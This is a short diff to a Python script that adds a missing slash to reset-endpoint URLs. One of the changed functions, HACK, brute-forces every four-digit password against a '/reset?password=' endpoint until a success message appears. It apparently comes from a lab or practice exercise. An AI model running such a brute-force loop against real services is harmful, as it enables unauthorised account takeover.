@@ -119,7 +119,7 @@ def GET(url):
 
 def CLEAR(url):
     password = input("What is the user's password: ")
-    cString = "reset?password="
+    cString = "/reset?password="
     clear_response = requests.post(url+cString+password)
     print(clear_response.status_code)
     print(clear_response.headers)
@@ -131,7 +131,7 @@ def HACK(url):
     for i in range(10000):
         guess = str(i).zfill(4)
         attempts += 1
-        clear_response = requests.post(url + "reset?password=" + guess)
+        clear_response = requests.post(url + "/reset?password=" + guess)
         response_text = clear_response.text.lower()
         if "password reset successful" in response_text:  
             print(f"Password found: {guess}")
